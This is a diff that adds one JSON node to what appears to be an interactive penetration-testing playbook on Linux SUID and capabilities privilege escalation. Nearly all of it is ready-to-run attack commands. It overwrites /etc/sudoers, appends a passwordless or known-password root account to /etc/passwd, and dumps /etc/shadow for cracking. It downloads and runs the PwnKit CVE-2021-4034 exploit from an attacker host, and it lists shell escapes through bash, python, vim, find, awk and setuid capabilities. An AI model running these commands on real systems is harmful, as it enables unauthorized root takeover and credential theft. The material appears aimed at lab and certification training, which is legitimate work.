@@ -1,0 +1,22 @@
+{
+  "id": "suid_check",
+  "phase": "LINUX",
+  "title": "SUID / Capabilities Exploitation",
+  "body": "SUID binaries run as their owner (often root). eUID=0 even if uid shows your user. cp SUID is clean — overwrite /etc/sudoers directly. Always check GTFOBins with SUID filter.",
+  "cmd": "# ── FIND SUID BINARIES ───────────────────────────────\nfind / -perm -u=s -type f 2>/dev/null\nfind / -perm -g=s -type f 2>/dev/null\n# Reference: https://gtfobins.github.io (enable SUID filter)\n\n# ── CP (SUID) — CLEANEST METHOD ──────────────────────\n# cp runs as root, can overwrite any file\n# Method 1: overwrite /etc/sudoers (smoothest)\necho \"joe ALL=(ALL) NOPASSWD: ALL\" > /tmp/sudoers\ncp /tmp/sudoers /etc/sudoers\nsudo su\n# or: sudo bash\n\n# Method 2: add root user to /etc/passwd\ncp /etc/passwd /tmp/passwd.bak\nopenssl passwd w00t        # → Fdzt.eqJQ4s0g\necho \"jimi421:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash\" >> /tmp/passwd.bak\ncp /tmp/passwd.bak /etc/passwd\nsu jimi421   # password: w00t\n\n# Method 3: read /etc/shadow\ncp /etc/shadow /tmp/shadow.txt\ncat /tmp/shadow.txt\n# Then crack with hashcat -m 1800\n\n# ── PKEXEC (SUID) — PWNKIT CVE-2021-4034 ───────────\n# pkexec is SUID by design but vulnerable versions = instant root\n# Affects pkexec < 0.120 — all major distros\npkexec --version\n# 0.105 = vulnerable (lab validated: Pelican PG Play)\n# 0.105, 0.106, 0.107... up to 0.119 = all vulnerable\n\n# Precompiled exploit (fastest):\nwget http://$lhost/PwnKit -O /tmp/PwnKit\nchmod +x /tmp/PwnKit && /tmp/PwnKit\n# github.com/ly4k/PwnKit\n\n# Source compile:\n# git clone https://github.com/berdav/CVE-2021-4034\n# make && ./cve-2021-4034\n\n# ── FIND (SUID) ───────────────────────────────────────\nfind / -name . -exec /bin/bash -p ; -quit\nfind /tmp -exec /bin/bash -p ; -quit\n# -p preserves effective UID = runs as root\n\n# ── BASH (SUID) ───────────────────────────────────────\n/bin/bash -p\n# bash-5.0# euid=0(root)\n\n# ── PYTHON / PYTHON3 (SUID) ──────────────────────────\npython3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\npython -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\n\n# ── VIM (SUID) ────────────────────────────────────────\nvim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'\nvim -c ':!/bin/bash -p'\n# Or from inside vim: :shell\n\n# ── LESS / MORE (SUID) ───────────────────────────────\nless /etc/passwd\n# Inside less: !/bin/bash -p\n\n# ── NMAP (SUID — older versions) ─────────────────────\nnmap --interactive\n# nmap> !sh\n\n# ── PERL (SUID) ───────────────────────────────────────\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n\n# ── AWK (SUID) ────────────────────────────────────────\nawk 'BEGIN {system(\"/bin/bash -p\")}'\n\n# ── NANO (SUID) ───────────────────────────────────────\n# Open any file, then:\n# Ctrl+R Ctrl+X\n# reset; bash -p 1>&0 2>&0\n\n# ── XXDE / TCLSH / RUBY (SUID) ───────────────────────\n# xxd — read shadow\nxxd /etc/shadow | xxd -r\n# tclsh\ntclsh <<< 'exec /bin/bash -p'\n# ruby\nruby -e 'exec \"/bin/bash -p\"'\n\n# ── DD (SUID) — read/write any file ──────────────────\n# Read shadow\ndd if=/etc/shadow 2>/dev/null\n# Overwrite passwd\necho \"r00t::0:0:root:/root:/bin/bash\" | dd of=/etc/passwd conv=append oflag=append\n\n# ── TAR (SUID) ────────────────────────────────────────\ntar -czf /tmp/shadow.tar.gz /etc/shadow\ntar -xzf /tmp/shadow.tar.gz -C /tmp\ncat /tmp/etc/shadow\n\n# ── CAPABILITIES (getcap) ─────────────────────────────\ngetcap -r / 2>/dev/null\n# cap_setuid+ep  = setuid to root\n# cap_net_raw+ep = raw packet capture\n# cap_dac_read_search = bypass read permission checks\n\n# perl cap_setuid\nperl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'\n# python3 cap_setuid\npython3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n# node cap_setuid\nnode -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\",[],{stdio:\"inherit\"})'\n\n# ── VERIFY ────────────────────────────────────────────\nid\n# uid=1000(joe) gid=1000(joe) euid=0(root) = root even though uid shows joe\nwhoami",
+  "warn": "cp SUID → overwrite /etc/sudoers is the smoothest path — no shell needed, just sudo su after. Always use -p flag with bash/sh to preserve effective UID, otherwise it resets to your real UID.",
+  "choices": [
+    {
+      "label": "Got root — grab proof",
+      "next": "got_root_linux"
+    },
+    {
+      "label": "Got shadow — crack hashes",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Back to full enum",
+      "next": "linux_post_exploit"
+    }
+  ]
+}
